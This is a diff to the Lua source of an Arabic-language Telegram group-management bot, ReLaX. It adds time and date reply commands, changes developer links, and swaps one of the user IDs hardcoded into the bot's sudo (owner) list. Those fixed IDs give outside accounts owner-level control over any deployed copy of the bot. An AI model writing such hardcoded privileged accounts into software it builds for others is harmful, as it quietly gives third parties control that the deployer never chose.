@@ -127,7 +127,7 @@ ReLaX Source
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId or Config.SUDO
-SudoIds = {Config.SudoIds,218385683,742655070} or {Config.sudo_users,218385683,742655070}
+SudoIds = {Config.SudoIds,1747074849,742655070} or {Config.sudo_users,1747074849,742655070}
 ReLaX = Config.ReLaX or Config.bot_id
 TokenBot = Config.TokenBot or Config.token
 NameBot = (DevAli:get(ReLaX..'Ali:NameBot') or 'ريلاكس')
@@ -1070,6 +1070,15 @@ DevAli:set(ReLaX.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائل
 DevAli:sadd(ReLaX.."List:Cmd:Group:New"..msg.chat_id_,"رس")
     send(msg.chat_id_, msg.id_,"⌁︙تم ترتيب الاوامر بالشكل التالي ~\n- ايدي - ا .\n- رفع مميز - م .\n-رفع ادمن - اد .\n- رفع مدير - مد . \n- رفع منشى - من . \n- رفع منشئ الاساسي - اس  .\n- رفع مطور - مط .\n-رفع مطور ثانوي - ثانوي .\n- تنزيل الكل - تك .\n- تعطيل الايدي بالصوره - تعط .\n- تفعيل الايدي بالصوره - تفع .\n- الرابط - ر .\n- ردود المدير - رر .\n- مسح المكتومين - ،، .\n- اضف رد - رد .\n- مسح سحكاتي - سح .\n- مسح رسائلي - رس .")  
     end
+    if text == "الساعه" then
+local ramsesj20 = "\n الساعه الان : "..os.date("%I:%M%p")
+send(msg.chat_id_, msg.id_,ramsesj20)
+end
+
+if text == "التاريخ" then
+local ramsesj20 =  "\n التاريخ : "..os.date("%Y/%m/%d")
+send(msg.chat_id_, msg.id_,ramsesj20)
+end
 if text == "اضف امر" or text == "اضافة امر" or text == "اضافه امر" and ChCheck(msg) then
 DevAli:set(ReLaX.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
 Dev_Ali(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر القديم", 1, 'html')
@@ -3695,9 +3704,9 @@ Welcome To Source
 
 ⌁︙[Exp Source](https://t.me/St3R7)
 
-⌁︙[Developer](https://t.me/DDO0DD)
+⌁︙[Developer](https://t.me/AAAPA)
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⌁︙[Tws ReLaX](https://t.me/N5Qbot)
+⌁︙[Tws ReLaX](https://t.me/N5zbot)
 ]]
 Dev_Ali(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end
